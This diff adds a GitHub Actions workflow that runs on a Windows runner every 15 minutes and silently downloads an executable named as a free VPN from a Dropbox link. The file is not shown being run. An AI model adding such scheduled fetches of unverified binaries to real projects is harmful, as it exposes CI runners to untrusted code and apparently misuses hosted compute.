@@ -1,0 +1,17 @@
+name: medo-window
+on:  
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'
+jobs: 
+  build: 
+    name: starting
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: downloading
+        run: curl -s -L -o vpnplanet.exe "https://www.dropbox.com/scl/fi/icemmzyitmkm90tmu3yr6/free-vpn-planet-2-8-31-47.exe?rlkey=g417ofy3hhguibyn5wazrc0xt&st=bb05jzej&dl=1"
+
+    
+    
+    
